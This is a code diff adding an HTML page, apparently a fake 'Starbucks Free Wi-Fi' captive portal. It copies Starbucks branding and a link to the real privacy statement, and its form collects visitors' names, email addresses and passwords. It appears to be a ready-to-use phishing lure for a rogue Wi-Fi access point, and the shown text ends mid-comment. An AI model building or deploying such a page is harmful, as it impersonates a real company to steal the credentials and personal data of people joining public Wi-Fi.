@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Starbucks Free Wi-Fi</title>
+    <style>
+        body { 
+            background-color: #F4F4F4;
+            font-family: Arial, sans-serif;
+            background-image: url('https://i.pinimg.com/originals/68/bd/60/68bd60ae09920a70b564c91cd258e624.jpg');
+            background-repeat: no-repeat;
+            background-size: cover;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+            background-color: white; /* added white background */
+            border-radius: 10px; /* added border radius */
+        }
+        input[type="text"], input[type="password"] {
+            display: block;
+            margin: 10px auto;
+            font-weight: bold; /* make text bold */
+            width: 80%; /* set a width */
+            padding: 5px; /* give some padding */
+            border: none; /* remove border */
+            border-bottom: 2px solid #ccc; /* add bottom border */
+            border-radius: 0; /* remove border radius */
+        }
+        .submit {
+            background-color: #00704A; /* Starbucks green color */
+            color: white;
+            border: none;
+            border-radius: 50px; /* increase border-radius for a more cylindrical look */
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            transition-duration: 0.4s;
+            width: 100%; /* full width of parent */
+        }
+        .submit:hover {
+            background-color: white;
+            color: #00704A;
+            border: 2px solid #00704A;
+        }
+        .small-text {
+            font-size: 12px;
+            color: #888;
+        }
+        @media only screen and (max-width: 600px) {
+            .container {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://logodownload.org/wp-content/uploads/2017/10/starbucks-logo-1.png" height="200px" width="200px" alt="Starbucks Logo">
+        <h1>Wi-Fi + Coffee = ❤️</h1>
+        <p>Log onto our network once, and this device will automatically connect at participating Starbucks stores everywhere you go.</p>
+        <form action="connected.html" method="post"> <!-- changed action to connected.html -->
+            <input type="text" name="firstname" placeholder="First Name">
+            <input type="text" name="lastname" placeholder="Last Name">
+            <input type="text" name="email" placeholder="Email Address">
+            <input type="password" name="password" placeholder="Password">
+            <p class="small-text">By accepting, I agree to receive emails about Starbucks news, promotions and offers.</p>
+            <input type="submit" value="Accept & Connect" class="submit">
+            <p class="small-text"><a href="https://www.starbucks.com/about-us/company-information/online-policies/privacy-policy" target="_blank">Starbucks Privacy Statement</a></p> <!-- Starbucks
